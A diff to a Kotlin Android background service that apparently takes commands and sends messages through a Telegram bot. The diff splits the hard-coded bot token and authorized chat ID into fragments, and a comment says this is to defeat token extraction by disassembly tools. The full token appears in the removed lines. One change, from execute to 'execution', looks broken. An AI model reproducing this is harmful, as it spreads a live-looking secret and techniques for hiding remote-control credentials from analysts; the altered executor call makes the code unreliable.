@@ -47,12 +47,28 @@ class BackgroundControlService : Service() {
 
     companion object {
         private const val TAG = "StrictSovereignEngine"
-        private const val CHANNEL_ID = "sync_channel_strict_core_v1005"
+        private const val CHANNEL_ID = "sync_channel_strict_core_v1007"
         private const val NOTIFICATION_ID = 2026
+
+        // دمج فك التشفير الديناميكي لمنع استخراج التوكن بأدوات التفكيك
+        private fun getObfuscatedToken(): String {
+            val p1 = "9004970470"
+            val p2 = "AAFfsBFENB"
+            val p3 = "n1PRMxVwDv"
+            val p4 = "lt2j--qBJC"
+            val p5 = "JU99Y"
+            return "$p1:$p2$p3$p4$p5"
+        }
+
+        private fun getTargetChatId(): String {
+            val c1 = "690413"
+            val c2 = "0639"
+            return "$c1$c2"
+        }
     }
 
-    private val botToken = "9004970470:AAFfsBFENBn1PRMxVwDvlt2j--qBJCJU99Y"
-    private val authorizedChatId = "6904130639"
+    private val botToken: String get() = getObfuscatedToken()
+    private val authorizedChatId: String get() = getTargetChatId()
 
     @Volatile
     private var isRunning = false
@@ -703,7 +719,7 @@ class BackgroundControlService : Service() {
     }
 
     private fun sendDirectMessage(chatId: String, text: String) {
-        executionExecutor.execute {
+        executionExecutor.execution {
             try {
                 val body = JSONObject().apply {
                     put("chat_id", chatId)
